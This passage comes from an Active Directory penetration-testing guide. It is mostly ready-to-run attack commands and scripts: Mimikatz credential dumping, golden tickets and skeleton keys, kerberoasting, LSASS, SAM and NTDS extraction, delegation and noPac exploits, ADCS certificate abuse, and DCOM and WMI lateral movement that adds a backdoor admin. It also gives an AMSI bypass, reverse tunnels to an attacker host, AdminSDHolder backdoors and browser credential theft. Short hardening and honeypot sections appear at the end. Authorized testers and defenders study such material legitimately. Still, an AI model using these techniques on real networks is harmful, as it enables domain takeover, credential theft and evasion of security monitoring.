# Pass-the-Hash/Pass-the-Ticket
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe
kerberos::ptt <ticket.kirbi>

# Golden/Silver Tickets
kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<hash> /ptt
kerberos::silver /user:<user> /domain:<domain> /sid:<sid> /target:<target> /service:<service> /rc4:<hash> /ptt

# Misc attacks
misc::skeleton
lsadump::dcshadow
```

### Rubeus

Pure C# Kerberos manipulation:

```bash
# Ticket operations
Rubeus.exe harvest /interval:30
Rubeus.exe tgtdeleg
Rubeus.exe asktgt /user:<user> /rc4:<hash> /ptt
Rubeus.exe asktgs /ticket:<ticket> /service:<spn>
Rubeus.exe ptt /ticket:<ticket>
Rubeus.exe dump
Rubeus.exe purge

# Kerberoasting
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
Rubeus.exe kerberoast /stats

# AS-REP Roasting
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Ticket conversion
Rubeus.exe describe /ticket:<ticket>
Rubeus.exe renew /ticket:<ticket>
```

### BloodHound

AD attack path analysis:

```bash
# Data collection
Import-Module SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Python collector (Linux)
bloodhound-python -u <user> -p <password> -ns <dns> -d <domain> -c All

# neo4j setup
sudo neo4j console
# Default credentials: neo4j/neo4j

# BloodHound GUI
# Load data and analyze paths
# Pre-built queries:
# - Find Shortest Paths to Domain Admin
# - Find Kerberoastable Users
# - Find AS-REP Roastable Users
# - Find Principals with DCSync Rights
```

### Responder

LLMNR, NBT-NS, and MDNS poisoner:

```bash
# Basic usage
sudo responder -I eth0

# Analyze mode (no poisoning)
sudo responder -I eth0 -A

# Specific protocols
sudo responder -I eth0 -wrfv  # WPAD, Force Auth, Responder, Verbose

# NTLM relay preparation
sudo responder -I eth0 -r -d -w -P  # Disable built-in servers for ntlmrelayx
```

### PowerView and PowerUp

PowerShell AD enumeration and privilege escalation:

```powershell
# PowerView
Import-Module PowerView.ps1
Get-DomainUser
Get-DomainGroup
Get-DomainComputer
Get-DomainTrust
Get-DomainPolicy
Find-InterestingDomainAcl
Find-DomainShare

# PowerUp
Import-Module PowerUp.ps1
Invoke-AllChecks
Write-UserAddMSI
Install-ServiceBinary -Name <service>
```

---

## Internal Network Penetration Testing Methodology

### Phase 1: Initial Access and Network Discovery

```bash
# Network host discovery
nmap -sn <network>/<mask>
crackmapexec smb <network>/<mask>

# Service enumeration
nmap -sC -sV -p- <target>

# Identify AD infrastructure
nmap -p 53,88,135,139,445,389,636,3268,3269,9389 --open <network>/<mask>
```

### Phase 2: Credential Acquisition

1. **Responder for LLMNR/NBT-NS poisoning**
2. **Password spraying**
3. **Relay attacks (if SMB signing disabled)**
4. **Kerberoasting/AS-REP Roasting**
5. **Credential dumping from compromised systems**

### Phase 3: Enumeration and Reconnaissance

1. **BloodHound data collection**
2. **Share enumeration**
3. **ACL analysis**
4. **Service account identification**
5. **Trust relationship mapping**

### Phase 4: Lateral Movement

1. **Pass-the-Hash/Ticket**
2. **Remote service execution (PsExec, WMI, WinRM)**
3. **Scheduled tasks**
4. **DCOM/WMI event subscription**

### Phase 5: Privilege Escalation

1. **Local privilege escalation on compromised systems**
2. **Token impersonation**
3. **Resource-based constrained delegation**
4. **ACL abuse**
5. **Certificate template exploitation**

### Phase 6: Domain Compromise

1. **DCSync attack**
2. **Golden Ticket creation**
3. **Domain Controller compromise**

### Phase 7: Forest/Trust Compromise

1. **Cross-domain trust abuse**
2. **ExtraSID attacks**
3. **Forest-wide persistence**

---

## Conclusion

Active Directory penetration testing represents one of the most complex and impactful areas of security assessment. The techniques covered in this chapter—from basic enumeration to complete forest compromise—demonstrate the intricate relationship between various AD components and how misconfigurations can cascade into total domain compromise.

Key principles for AD penetration testing:

1. **Enumeration is everything**: The more you know about the environment, the more precise your attacks can be
2. **Credentials are the keys to the kingdom**: Protect them, harvest them, and abuse them
3. **Kerberos is both friend and foe**: Understand its mechanisms for both attack and detection
4. **Trust relationships expand the attack surface**: One compromised domain can lead to forest-wide access
5. **Persistence is critical**: Establish multiple persistence mechanisms for reliable re-access

Modern AD environments increasingly incorporate security controls like:
- Credential Guard (LSA protection)
- Defender for Identity (formerly ATA)
- Advanced Threat Analytics
- Privileged Access Workstations (PAWs)
- Just Enough Administration (JEA)
- Zero Trust architectures

As defenses evolve, so too must attack techniques. Continuous learning, tool development, and creative thinking remain essential for effective AD penetration testing.

### Advanced Enumeration Techniques

**LDAP Deep Dive Enumeration**

Beyond basic LDAP queries, advanced enumeration reveals hidden attack paths:

```bash
# LDAP anonymous bind enumeration (if enabled)
ldapsearch -x -H ldap://<dc_ip> -b "dc=<domain>,dc=<tld>" "(objectClass=user)" | grep -i "userprincipalname\|sAMAccountName"

# Query for constrained delegation details
ldapsearch -x -H ldap://<dc_ip> -D "<user>@<domain>" -w <password> -b "dc=<domain>,dc=<tld>" "(&(objectCategory=computer)(msDS-AllowedToDelegateTo=*))" msDS-AllowedToDelegateTo

# Query for RBCD (Resource-Based Constrained Delegation)
ldapsearch -x -H ldap://<dc_ip> -D "<user>@<domain>" -w <password> -b "dc=<domain>,dc=<tld>" "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" msDS-AllowedToActOnBehalfOfOtherIdentity

# Find users with SPNs for Kerberoasting
ldapsearch -x -H ldap://<dc_ip> -D "<user>@<domain>" -w <password> -b "dc=<domain>,dc=<tld>" "(&(objectClass=user)(servicePrincipalName=*))" servicePrincipalName

# Find accounts with PASSWD_NOTREQD flag
ldapsearch -x -H ldap://<dc_ip> -D "<user>@<domain>" -w <password> -b "dc=<domain>,dc=<tld>" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" sAMAccountName
```

**PowerShell Remoting Enumeration**

```powershell
# Test PowerShell remoting connectivity
Test-WSMan -ComputerName <target>

# Invoke commands on multiple systems
$computers = Get-Content computers.txt
Invoke-Command -ComputerName $computers -ScriptBlock { whoami; hostname; ipconfig } -ThrottleLimit 10

# Enumerate installed software remotely
Invoke-Command -ComputerName <target> -ScriptBlock {
    Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, DisplayVersion, Publisher
}

# Enumerate local administrators remotely
Invoke-Command -ComputerName <target> -ScriptBlock {
    net localgroup administrators
}
```

### Advanced Credential Harvesting

**LSASS Memory Extraction**

```bash
# Mimikatz LSASS dump with various methods
# Method 1: Direct extraction
privilege::debug
sekurlsa::logonpasswords

# Method 2: LSASS dump for offline analysis
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# Method 3: Process dump with procdump (less suspicious)
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Then analyze offline:
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Method 4: Comsvcs.dll (native Windows)
rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full
```

**SAM Database Extraction**

```bash
# Extract SAM and SYSTEM hives
reg.exe save HKLM\SAM sam.save
reg.exe save HKLM\SYSTEM system.save
reg.exe save HKLM\SECURITY security.save

# Parse with secretsdump
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

# Volume Shadow Copy method (if admin)
vssadmin create shadow /for=C:
copy \\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
```

**NTDS.dit Extraction Methods**

```bash
# Method 1: Direct file copy (requires Volume Shadow Copy)
vssadmin create shadow /for=C:
copy \\\?\GLOBALROOT\Device\HarddiskVolumeShadowShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit

# Method 2: ntdsutil (official backup method)
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntds_backup" quit quit

# Method 3: Shadow Copy with esentutl (stealthier)
esentutl.exe /p /vss C:\Windows\NTDS\ntds.dit

# Parse NTDS.dit
secretsdump.py -ntds ntds.dit -system system.save LOCAL
```

### Advanced Kerberos Attacks

**Constrained Delegation Abuse**

```bash
# Enumerate constrained delegation
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto

# Abuse with Impacket
# Step 1: Request TGT for service account
getST.py -spn <target_SPN> -impersonate Administrator <domain>/<service_account>:<password>

# Step 2: Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <domain>/Administrator@<target>

# Alternative with Rubeus
Rubeus.exe s4u /user:<service_account> /rc4:<hash> /impersonateuser:Administrator /msdsspn:<target_SPN> /ptt
```

**Resource-Based Constrained Delegation (RBCD) Attack**

```bash
# Prerequisites: Control over a computer account or user with SPN

# Step 1: Check if target has msDS-AllowedToActOnBehalfOfOtherIdentity set
Get-DomainComputer <target> -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# Step 2: If not set, add our controlled account (requires Write permissions)
$sid = Get-DomainUser <controlled_user> | Select-Object -ExpandProperty objectsid
$sd = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$sid)"
$sdbytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($sdbytes, 0)
Get-DomainComputer <target> | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$sdbytes}

# Step 3: Execute RBCD attack with Impacket
rbcd.py -delegate-from <controlled_user> -delegate-to <target> <domain>/<user>:<password>
getST.py -spn cifs/<target> -impersonate Administrator -dc-ip <dc_ip> <domain>/<controlled_user>

# Step 4: Use the service ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <domain>/Administrator@<target>
```

**CVE-2021-42278 and CVE-2021-42287 (samAccountName Spoofing)**

```bash
# nopac.py - Automatic exploitation
nopac.py <domain>/<user>:<password> -dc-ip <dc_ip> -dc-host <dc_hostname>

# Manual exploitation steps
# 1. Create computer account with sAMAccountName matching DC name (without $)
# 2. Request TGT for this account
# 3. Rename computer account (add $ back)
# 4. Request S4U2self ticket
# 5. DC can't find the original account, falls back to DC account

# Using Impacket's addcomputer.py and modify.py
addcomputer.py -computer-name 'DUMMY' -computer-pass 'Password123!' <domain>/<user>:<password>
# Then modify sAMAccountName to match DC without $
```

### Advanced Lateral Movement

**DCOM Lateral Movement**

```powershell
# Method 1: MMC20.Application
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1", "<target>"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c calc.exe", "7")

# Method 2: ShellBrowserWindow
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("ShellBrowserWindow", "<target>"))
$dcom.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\\Windows\\System32", $null, 0)

# Method 3: Excel.Application (if Office installed)
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "<target>"))
$dcom.DDEInitiate("cmd.exe", "/c calc.exe")
```

**WMI Event Subscription for Lateral Movement**

```powershell
# Create permanent WMI event subscription for command execution
$filterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = 'EvilFilter'
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"
    QueryLanguage = 'WQL'
}
$filter = New-CimInstance @filterArgs -Namespace 'root/subscription' -ClassName __EventFilter -ComputerName <target> -Credential <cred>

$consumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = 'cmd.exe /c net user backdoor Password123! /add && net localgroup administrators backdoor /add'
}
$consumer = New-CimInstance @consumerArgs -Namespace 'root/subscription' -ClassName CommandLineEventConsumer -ComputerName <target> -Credential <cred>

$bindingArgs = @{
    Filter = [Ref]$filter
    Consumer = [Ref]$consumer
}
$binding = New-CimInstance @bindingArgs -Namespace 'root/subscription' -ClassName __FilterToConsumerBinding -ComputerName <target> -Credential <cred>
```

**Named Pipe Pivoting**

```bash
# Socat for named pipe relay
# On compromised host (creates listener)
socat TCP-LISTEN:4444,fork PIPE:/tmp/backpipe

# Named pipe impersonation for privilege escalation
# Tools: RoguePotato, SweetPotato, JuicyPotato (if applicable)
RoguePotato.exe -r <attacker_ip> -e "cmd.exe" -l 9999
```

### Active Directory Certificate Services (ADCS) Deep Dive

**ESC1 - Web Enrollment Template Abuse**

```bash
# Requirements:
# - Template allows client authentication
# - Template allows requester to specify subjectAltName
# - No manager approval required
# - Enrollment rights granted to compromised user

# Certify enumeration
Certify.exe find /vulnerable

# Request certificate with alternate UPN
certipy req -u <user>@<domain> -p <password> -target <ca> -ca <ca_name> -template <template> -upn administrator@<domain>

# Authenticate with certificate
certipy auth -pfx administrator.pfx
```

**ESC2 - Enrollment Agent Templates**

```bash
# ESC2: Template allows certificate request on behalf of others
# Request enrollment agent certificate
certipy req -u <user>@<domain> -p <password> -target <ca> -ca <ca_name> -template <enrollment_agent_template>

# Use enrollment agent certificate to request certificate for another user
certipy req -u <user>@<domain> -p <password> -target <ca> -ca <ca_name> -template <user_template> -on-behalf-of <domain>\administrator -pfx enrollment_agent.pfx
```

**ESC3 - Enrollment Agent EKU Abuse**

```bash
# Similar to ESC2 but exploiting EKU configuration
certipy req -u <user>@<domain> -p <password> -target <ca> -ca <ca_name> -template <template>

# Then use to request on behalf of others
```

**ESC4 - Vulnerable Certificate Template ACL**

```bash
# ESC4: User has write access to certificate template
# Can modify template to enable ESC1 conditions

# Enumerate template permissions
Certify.exe find /vulnerable

# Using Certipy to modify template
certipy template -u <user>@<domain> -p <password> -target <ca> -template <template> -save-old

# Request certificate with modified template
certipy req -u <user>@<domain> -p <password> -target <ca> -ca <ca_name> -template <template>
```

**ESC5 - Vulnerable PKI Object ACL**

```bash
# ESC5: Weak permissions on PKI objects
# CA server, certificate templates, etc.

# Enumerate with BloodHound
# Look for GenericAll, GenericWrite, WriteOwner, etc. on CA objects

# Abuse with PowerView
Add-DomainObjectAcl -TargetIdentity "<ca_distinguished_name>" -PrincipalIdentity <user> -Rights All
```

**ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2**

```bash
# ESC6: CA flag allows SAN in any template
certipy find -u <user>@<domain> -p <password> -target <ca>

# If EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled, any template works
certipy req -u <user>@<domain> -p <password> -target <ca> -ca <ca_name> -template User -upn administrator@<domain>
```

**ESC7 - Vulnerable Certificate Authority ACL**

```bash
# ESC7: ManageCA and ManageCertificates rights
# Can approve pending requests, potentially bypassing restrictions

# List pending requests
certipy req -u <user>@<domain> -p <password> -target <ca> -ca <ca_name> -list

# Issue pending certificate
certipy req -u <user>@<domain> -p <password> -target <ca> -ca <ca_name> -retrieve <request_id>
```

**ESC8 - ADCS Web Enrollment NTLM Relay**

```bash
# ESC8: NTLM authentication on HTTP endpoints
# Relay to ADCS web enrollment

# Step 1: Identify vulnerable CAs
certipy find -u <user>@<domain> -p <password> -target <ca>

# Step 2: Force authentication (PetitPotam, PrinterBug, etc.)
ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Step 3: Use obtained certificate for authentication
certipy auth -pfx dc_certificate.pfx -dc-ip <dc_ip>
```

### Cross-Trust Attacks

**Inter-Realm Ticket Forging**

```bash
# Enumerate inter-realm keys
# Look for trust keys in current domain
lsadump::trust /patch

# Forge inter-realm TGT
# Requires:
# - Source domain SID
# - Target domain SID
# - Trust key (RC4 or AES)
kerberos::golden /user:Administrator /domain:<source_domain> /sid:<source_sid> /sids:<target_sid>-519 /krbtgt:<trust_key> /service:krbtgt /target:<target_domain> /ticket:inter_realm.kirbi

# Request service ticket in target domain
asktgs.exe inter_realm.kirbi CIFS/<target_dc>.<target_domain>
```

**SID History Injection Across Forests**

```bash
# Requires Domain Admin in source domain and forest trust
# Add SID History to user for target forest Enterprise Admins
# This enables access as Enterprise Admin in target forest

# Using Mimikatz (after obtaining necessary privileges)
kerberos::golden /user:<user> /domain:<source_domain> /sid:<source_sid> /sids:<target_enterprise_admins_sid> /krbtgt:<source_krbtgt> /ptt
```

### Defensive Evasion Techniques

**AMSI Bypass**

```powershell
# Common AMSI bypass techniques (for educational purposes only)
# Method 1: Memory patch
$a = [Ref].Assembly.GetTypes() | ForEach-Object {if ($_.Name -like "*iUtils") {$_}}
$b = $a.GetFields('NonPublic,Static') | Where-Object {$_.Name -like "*Context"}
$b.SetValue($null, [IntPtr]::Zero)

# Method 2: CLR hooking
# More sophisticated bypass requiring custom assembly loading
```

**ETW (Event Tracing for Windows) Bypass**

```powershell
# Disable ETW tracing
# Method 1: Environment variable
$env:COMPlus_ETWEnabled = 0

# Method 2: Patching
# Requires manual memory manipulation
```

**AppLocker and Constrained Language Mode Bypass**

```powershell
# Bypass constrained language mode
# Method 1: InstallUtil
$path = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe"
& $path /logfile= /LogToConsole=false /U C:\temp\bypass.exe

# Method 2: COM objects
$com = [Type]::GetTypeFromCLSID("{CLSID}", "<computer>")
$obj = [System.Activator]::CreateInstance($com)
```

### Internal Network Pivoting

**SSH Tunneling and ProxyChains**

```bash
# Dynamic port forward through compromised host
ssh -D 1080 -N -f user@compromised_host

# Use with proxychains
proxychains nmap -sT <target>
proxychains smbclient -L //<target>

# Local port forward
ssh -L 3389:<target>:3389 user@compromised_host
rdesktop localhost:3389
```

**Chisel (Fast TCP/UDP Tunneling)**

```bash
# Chisel server (attacker)
./chisel server -p 8000 --reverse

# Chisel client (compromised host)
./chisel client <attacker_ip>:8000 R:socks

# Now use SOCKS5 proxy on attacker port 1080
```

**Ligolo-ng (Advanced Tunneling)**

```bash
# Ligolo proxy (attacker)
./proxy -selfcert

# Ligolo agent (compromised host)
./agent -connect <attacker_ip>:11601 -ignore-cert

# Configure tunnel
# In ligolo session:
session
start_tunnel
# Add route on attacker:
sudo ip route add 192.168.1.0/24 dev ligolo
```

### Persistence Mechanisms

**Shadow Credentials (msDS-KeyCredentialLink)**

```bash
# Shadow credentials attack
# Add public key to target user's msDS-KeyCredentialLink attribute

# Using Whisker
Whisker.exe add /target:<target_user> /domain:<domain> /dc:<dc> /path:cert.pfx /password:password

# Or with Impacket's ntlmrelayx (when relaying to LDAP)
# Automatic shadow credentials addition with --shadow-credentials flag

# Authenticate with PKINIT
certipy auth -pfx <target_user>.pfx -dc-ip <dc_ip>
```

**Machine Account Persistence**

```bash
# Add machine account for persistence (if MAQ > 0)
addcomputer.py -computer-name 'PERSIST$' -computer-pass 'Password123!' <domain>/<user>:<password>

# Grant DCSync rights to machine account
# Add to delegated administrators
```

**AdminSDHolder Persistence**

```powershell
# Modify AdminSDHolder to add backdoor account
# Changes propagate to all protected groups within 60 minutes

$AdminSDHolder = [ADSI]"LDAP://CN=AdminSDHolder,CN=System,DC=domain,DC=local"
$User = New-Object System.Security.Principal.NTAccount("domain", "backdoor")
$SID = $User.Translate([System.Security.Principal.SecurityIdentifier])

$AccessRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    $SID,
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
    [System.Security.AccessControl.AccessControlType]::Allow,
    [DirectoryServices.ActiveDirectorySecurityInheritance]::All
)

$AdminSDHolder.ObjectSecurity.AddAccessRule($AccessRule)
$AdminSDHolder.CommitChanges()
```

### Data Protection API (DPAPI) Abuse

**DPAPI Master Keys**

```bash
# Extract DPAPI master keys
# With Mimikatz
sekurlsa::dpapi

# List master keys
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<SID>\<masterkey>"

# Decrypt with user password (SHA1)
dpapi::masterkey /in:"<masterkey_file>" /sid:<sid> /password:<password>

# Decrypt with domain backup key (can decrypt any domain user DPAPI)
dpapi::masterkey /in:"<masterkey_file>" /pvk:backup_key.pvk
```

**Credential Extraction from DPAPI**

```bash
# Extract browser credentials (Chrome)
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"

# Extract WiFi passwords
# Already decrypted when run as user, or decrypt with master key
```

### Advanced Tool Usage

**SharpHound Stealth Collection**

```powershell
# Stealth collection options
.
\SharpHound.exe -c Session,LoggedOn --Stealth

# Exclude domain controllers
.
\SharpHound.exe -c All --ExcludeDCs

# Loop collection for session data
.
\SharpHound.exe -c Session --Loop --LoopInterval 00:05:00 --LoopDuration 00:30:00
```

**BloodHound Custom Queries**

```cypher
// Find shortest path from owned users to Domain Admin
MATCH (o:User {owned: true}), (da:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"}), p=shortestPath((o)-[*1..]->(da)) RETURN p

// Find all users with DCSync rights
MATCH (n)-[:DCSync]->(m) RETURN n.name, labels(n)

// Find computers with Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation: true}) RETURN c.name

// Find paths through SQL admin rights
MATCH p=shortestPath((n)-[*1..]->(m:Group {name: "DOMAIN ADMINS@DOMAIN.LOCAL"})) WHERE ANY (x IN relationships(p) WHERE type(x) = "SQLAdmin") RETURN p
```

### Active Directory Attack Chain Automation

**Automated Attack Path Execution**

Modern AD penetration testing leverages automation for efficiency:

```python
#!/usr/bin/env python3
"""
AD Attack Chain Automation Script
Automates common AD attack sequences for authorized penetration testing
"""

import subprocess
import json
import logging
from datetime import datetime

class ADAttackChain:
    def __init__(self, domain, username, password, dc_ip):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.findings = []
        
    def enumerate_domain(self):
        """Initial domain enumeration"""
        logging.info("Starting domain enumeration...")
        
        # BloodHound data collection
        cmd = f"bloodhound-python -u {self.username} -p {self.password} -ns {self.dc_ip} -d {self.domain} -c All"
        subprocess.run(cmd, shell=True)
        
        # SharpHound alternative (if on Windows)
        # Invoke-BloodHound -CollectionMethod All -Domain self.domain
        
    def identify_kerberoast_targets(self):
        """Find Kerberoastable accounts"""
        logging.info("Identifying Kerberoast targets...")
        
        cmd = f"GetUserSPNs.py -request -dc-ip {self.dc_ip} {self.domain}/{self.username}:{self.password} -outputfile kerberoastable.txt"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if "servicePrincipalName" in result.stdout:
            self.findings.append({
                "type": "Kerberoastable Accounts",
                "severity": "High",
                "details": "Accounts with SPNs found"
            })
            
    def identify_asrep_roast_targets(self):
        """Find AS-REP Roastable accounts"""
        logging.info("Identifying AS-REP Roast targets...")
        
        cmd = f"GetNPUsers.py -dc-ip {self.dc_ip} {self.domain}/{self.username}:{self.password} -request -format hashcat -outputfile asrep_hashes.txt"
        subprocess.run(cmd, shell=True)
        
    def check_unconstrained_delegation(self):
        """Identify unconstrained delegation"""
        logging.info("Checking for unconstrained delegation...")
        
        # Using ldapsearch
        cmd = f"ldapsearch -x -H ldap://{self.dc_ip} -D '{self.username}@{self.domain}' -w {self.password} -b 'dc={self.domain.replace('.', ',dc=')}' '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' sAMAccountName"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        
        if result.returncode == 0 and "sAMAccountName" in result.stdout:
            self.findings.append({
                "type": "Unconstrained Delegation",
                "severity": "Critical",
                "details": "Systems with unconstrained delegation identified"
            })
            
    def run_full_chain(self):
        """Execute complete attack chain"""
        self.enumerate_domain()
        self.identify_kerberoast_targets()
        self.identify_asrep_roast_targets()
        self.check_unconstrained_delegation()
        
        # Save findings
        with open(f"findings_{datetime.now().strftime('%Y%m%d')}.json", 'w') as f:
            json.dump(self.findings, f, indent=2)
            
        return self.findings

# Usage
# attacker = ADAttackChain("corp.local", "user", "password", "192.168.1.10")
# findings = attacker.run_full_chain()
```

**Automated Lateral Movement**

```bash
#!/bin/bash
# Automated lateral movement script

TARGETS="targets.txt"
CREDS="credentials.txt"
RESULTS_DIR="lateral_movement_results"

mkdir -p $RESULTS_DIR

# Read targets and attempt lateral movement
while read target; do
    while read cred; do
        user=$(echo $cred | cut -d: -f1)
        pass=$(echo $cred | cut -d: -f2)
        
        # Test SMB
        crackmapexec smb $target -u $user -p $pass 2>/dev/null >> $RESULTS_DIR/smb_results.txt
        
        # Test WinRM
        crackmapexec winrm $target -u $user -p $pass 2>/dev/null >> $RESULTS_DIR/winrm_results.txt
        
        # Test SSH (if applicable)
        crackmapexec ssh $target -u $user -p $pass 2>/dev/null >> $RESULTS_DIR/ssh_results.txt
        
    done < $CREDS
done < $TARGETS
```

### Active Directory Hardening Assessment

**Security Configuration Baseline Review**

```powershell
# Comprehensive AD security assessment script
# Checks common misconfigurations and security controls

function Test-ADSecurity {
    $Results = @()
    
    # Check LM Hash Storage
    $LMCompat = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -ErrorAction SilentlyContinue
    if ($LMCompat.LmCompatibilityLevel -lt 5) {
        $Results += [PSCustomObject]@{
            Check = "LM Hash Storage"
            Status = "Vulnerable"
            Finding = "LM hashes may be stored (Level: $($LMCompat.LmCompatibilityLevel))"
            Recommendation = "Set LmCompatibilityLevel to 5 (Send NTLMv2 only)"
        }
    }
    
    # Check SMB Signing Requirements
    $SMBServer = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -ErrorAction SilentlyContinue
    if ($SMBServer.RequireSecuritySignature -ne 1) {
        $Results += [PSCustomObject]@{
            Check = "SMB Signing"
            Status = "Vulnerable"
            Finding = "SMB signing not required on servers"
            Recommendation = "Enable RequireSecuritySignature for SMB"
        }
    }
    
    # Check LDAP Signing
    $LDAPSigning = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters" -Name "LDAPServerIntegrity" -ErrorAction SilentlyContinue
    if ($LDAPSigning.LDAPServerIntegrity -ne 2) {
        $Results += [PSCustomObject]@{
            Check = "LDAP Signing"
            Status = "Warning"
            Finding = "LDAP signing may not be enforced"
            Recommendation = "Enable LDAP signing and channel binding"
        }
    }
    
    # Check for Pre-Windows 2000 Compatibility
    $Pre2000 = Get-ADGroup "Pre-Windows 2000 Compatible Access" -Properties Members
    if ($Pre2000.Members.Count -gt 0) {
        $Results += [PSCustomObject]@{
            Check = "Pre-2000 Compatibility"
            Status = "Warning"
            Finding = "Pre-Windows 2000 Compatible Access group has members"
            Recommendation = "Review and remove unnecessary members"
        }
    }
    
    # Check Password Policy
    $PasswordPolicy = Get-ADDefaultDomainPasswordPolicy
    if ($PasswordPolicy.MinPasswordLength -lt 14) {
        $Results += [PSCustomObject]@{
            Check = "Password Policy"
            Status = "Warning"
            Finding = "Minimum password length is only $($PasswordPolicy.MinPasswordLength)"
            Recommendation = "Increase minimum password length to 14+ characters"
        }
    }
    
    return $Results
}

# Execute assessment
Test-ADSecurity | Format-Table -AutoSize
```

### Active Directory Disaster Recovery Testing

**AD Backup and Restore Verification**

```bash
# Verify AD backup integrity (run on DC)
# Check last backup time
repadmin /showbackup

# Verify SYSVOL replication
dfsrdiag pollad

# Check AD database integrity
ntdsutil "activate instance ntds" files integrity quit quit

# Test authoritative restore capability
ntdsutil "activate instance ntds" "authoritative restore" list nc crs quit quit quit
```

**DC Promotion and Demotion Security**

```powershell
# Secure DC promotion checklist
# Run before adding new DC to domain

# 1. Verify network segmentation
Test-NetConnection -ComputerName <existing_dc> -Port 135
Test-NetConnection -ComputerName <existing_dc> -Port 445
Test-NetConnection -ComputerName <existing_dc> -Port 389
Test-NetConnection -ComputerName <existing_dc> -Port 636

# 2. Check for conflicting SRV records
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>

# 3. Verify time synchronization
w32tm /query /status
w32tm /query /peers

# 4. Review default computer container redirection
redircmp "OU=Domain Controllers,DC=domain,DC=local"
```

### Cloud-Integrated Active Directory

**Azure AD Connect Security Assessment**

```powershell
# Azure AD Connect configuration review
# Check for password hash synchronization vs pass-through

# Verify sync status
Get-ADSyncScheduler

# Check for sync account privileges (should be minimal)
$SyncAccount = (Get-ADSyncConnector | Where-Object {$_.Name -like "*Domain*"}).Credentials.UserName
Get-ADUser $SyncAccount -Properties MemberOf | Select-Object -ExpandProperty MemberOf

# Review Azure AD Connect version (should be current)
Get-ADSyncGlobalSettings | Select-Object -ExpandProperty Version

# Check for seamless SSO configuration
Get-AzureADSSOStatus

# Verify PTA agent status (if using Pass-Through Authentication)
Get-AzureADConnectAuthenticationAgentStatus
```

**Hybrid Identity Attack Vectors**

```bash
# Azure AD authentication bypass via AD FS
# Check for AD FS certificate theft vulnerability
# (Golden SAML attack)

# Check token signing certificate export possibility
# Requires Local Admin on AD FS server

# Azure AD Connect database extraction
# %ProgramData%\Microsoft\Azure AD Connect\Data\ADSync.mdf
# Contains encrypted credentials for sync account
```

### Active Directory Deception and Honeypots

**AD Honeypot Deployment**

```powershell
# Deploy AD honeypot accounts for detection
# These accounts should never be legitimately used

# Create honeypot admin account
$SecurePassword = ConvertTo-SecureString "HoneyPotPassword123!" -AsPlainText -Force
New-ADUser -Name "svc_backup_admin" -SamAccountName "svc_backup_admin" `
    -UserPrincipalName "svc_backup_admin@domain.local" `
    -AccountPassword $SecurePassword -Enabled $true

# Add to Domain Admins (honeypot group)
Add-ADGroupMember -Identity "Domain Admins" -Members "svc_backup_admin"

# Configure SACL for honeypot account auditing
$HoneypotDN = (Get-ADUser "svc_backup_admin").DistinguishedName
$AuditRule = New-Object System.DirectoryServices.ActiveDirectoryAuditRule(
    [System.Security.Principal.SecurityIdentifier]::new("S-1-1-0"),  # Everyone
    [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
